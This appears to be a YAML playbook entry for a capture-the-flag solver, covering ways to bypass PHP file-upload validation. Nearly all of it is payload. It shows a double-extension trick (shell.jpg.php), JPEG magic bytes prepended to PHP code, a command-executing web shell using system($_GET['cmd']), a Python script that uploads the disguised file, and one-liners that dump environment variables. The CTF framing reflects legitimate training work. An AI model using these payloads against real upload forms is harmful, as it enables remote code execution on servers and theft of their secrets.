name: php_file_upload_bypass
category: web
tags: [file_upload, php, magic_number_bypass, extension_bypass, rce]
indicators:
  - "File upload with extension validation using strpos()"
  - "Magic number validation only checking first bytes"
  - "FLAG stored in environment variable"
  - "Apache with PHP enabled"

tricks:
  - name: "Extension validation bypass"
    when: "strpos($filename, '.jpg') !== false"
    how: "Use double extension like shell.jpg.php"
    payload: |
      # Validation: strpos($filename, '.jpg') !== false
      # Bypass: shell.jpg.php contains '.jpg' but ends with .php
      # Apache executes as PHP

  - name: "Magic number bypass"
    when: "Only first 2 bytes checked for JPEG (ffd8)"
    how: "Prepend JPEG magic number to PHP code"
    payload: |
      # JPEG magic number: \xff\xd8
      # Malicious content: \xff\xd8<?php system($_GET['cmd']); ?>
      
      import requests
      
      jpeg_magic = b'\xff\xd8'
      php_code = b'<?php echo getenv("FLAG"); ?>'
      malicious = jpeg_magic + php_code
      
      files = {'userfile': ('shell.jpg.php', malicious, 'image/jpeg')}
      requests.post(url, files=files)

  - name: "Get FLAG from environment variable"
    when: "FLAG stored in ENV"
    how: "Use getenv() or $_ENV in PHP"
    payload: |
      <?php echo getenv("FLAG"); ?>
      <?php echo $_ENV["FLAG"]; ?>
      <?php system("env | grep FLAG"); ?>

